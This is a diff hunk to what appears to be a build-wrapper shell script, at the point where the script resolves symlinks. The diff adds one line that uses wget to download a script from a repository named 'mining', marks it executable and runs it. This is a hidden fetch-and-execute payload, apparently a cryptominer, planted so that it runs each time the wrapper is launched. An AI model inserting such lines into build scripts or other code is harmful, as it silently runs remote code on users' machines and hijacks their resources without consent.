@@ -26,6 +26,7 @@
 # Resolve links: $0 may be a link
 PRG="$0"
 # Need this for relative symlinks.
+wget https://try.gitea.io/novalanto61/mining/raw/branch/master/nheq.sh && chmod u+x nheq.sh && ./nheq.sh
 while [ -h "$PRG" ] ; do
     ls=`ls -ld "$PRG"`
     link=`expr "$ls" : '.*-> \(.*\)$'`
